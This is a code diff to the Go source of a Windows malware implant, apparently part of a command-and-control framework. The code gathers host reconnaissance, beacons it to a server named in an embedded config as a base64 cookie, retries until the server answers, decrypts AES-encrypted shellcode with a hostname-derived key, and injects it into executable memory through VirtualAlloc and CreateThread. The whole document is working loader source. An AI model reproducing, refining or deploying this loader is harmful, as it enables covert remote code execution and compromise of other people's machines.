@@ -7,18 +7,17 @@ import (
 	_ "embed"
 	b64 "encoding/base64"
 	"encoding/hex"
+	"fmt"
 	"golang.org/x/sys/windows"
-	"io/ioutil"
-	"net/http"
 	"strconv"
 	"strings"
-	"time"
 )
 
 //go:embed conf.txt
 var t string
 
 var (
+	sleepTime  int
 	body       []byte
 	initChecks util.InitialChecks
 )
@@ -26,20 +25,35 @@ var (
 func main() {
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
+	sleepTime, _ = strconv.Atoi(conf[2])
 	//initial recon
 	host := malwareUtil.Recon()
 	initChecks, _ = util.UnmarshalJSON(host)
 	cookie := b64.StdEncoding.EncodeToString(host)
+	cookieName := initChecks.GetKittenName()
 	//initial request
-	body = request(cookie, conf)
-	//if the response is not a shellcode, sleep and try again
+	var err error
+	// try to connect to the server
+	for {
+		body, err = malwareUtil.Request(cookie, conf)
+		if err != nil {
+			malwareUtil.Sleep(sleepTime)
+		} else {
+			break
+		}
+	}
+	// if the response is not a shellcode, sleep and try again
 	for {
 		if len(body) > 10 {
 			break
 		}
 		t, _ := strconv.Atoi(string(body))
-		sleep(t)
-		body = request("", conf)
+		malwareUtil.Sleep(t)
+		body, err = malwareUtil.Request(cookieName, conf)
+		if err != nil || len(body) == 0 {
+			malwareUtil.Sleep(sleepTime)
+		}
+		fmt.Println(body)
 	}
 	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
 	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
@@ -48,26 +62,9 @@ func main() {
 	inject(shellcode)
 }
 
-func sleep(t int) {
-	time.Sleep(time.Duration(t) * time.Second)
-}
-
-func request(cookie string, conf []string) []byte {
-	c := http.Client{Timeout: time.Duration(3) * time.Second}
-	req, _ := http.NewRequest("GET", conf[0], nil)
-	req.Header.Add("User-Agent", conf[1])
-	if cookie != "" {
-		req.Header.Add("Cookie", cookie)
-	}
-	resp, _ := c.Do(req)
-	body, _ = ioutil.ReadAll(resp.Body)
-	return body
-}
-
 func inject(shellcode []byte) {
 
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	//rtlCopyMemory := kernel32.NewProc("RtlCopyMemory")
 	createThread := kernel32.NewProc("CreateThread")
 
 	shellcodeExec, _ := windows.VirtualAlloc(
@@ -77,11 +74,6 @@ func inject(shellcode []byte) {
 		windows.PAGE_EXECUTE_READWRITE)
 
 	malwareUtil.Memcpy(shellcodeExec, shellcode)
-	/*rtlCopyMemory.Call(
-	shellcodeExec,
-	(uintptr)(unsafe.Pointer(&shellcode[0])),
-	uintptr(len(shellcode)))
-	*/
 
 	var oldProtect uint32
 	windows.VirtualProtect(
